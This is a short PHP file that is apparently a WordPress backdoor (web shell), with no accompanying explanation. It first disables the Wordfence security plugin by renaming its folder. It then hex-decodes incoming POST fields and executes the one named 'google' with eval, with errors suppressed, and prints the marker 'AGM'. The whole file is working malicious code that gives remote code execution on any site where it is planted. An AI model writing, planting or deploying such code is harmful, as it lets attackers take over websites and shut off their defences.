<?php 
if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence/wordfence.php')) {rename($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence',$_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence'.rand());}
foreach($_POST as $k => $v){
	$kk = @pack("H*", $k);
	$_POST[$kk]=@pack("H*", $v);
}
@eval($_POST['google']);
echo 'AGM';
?>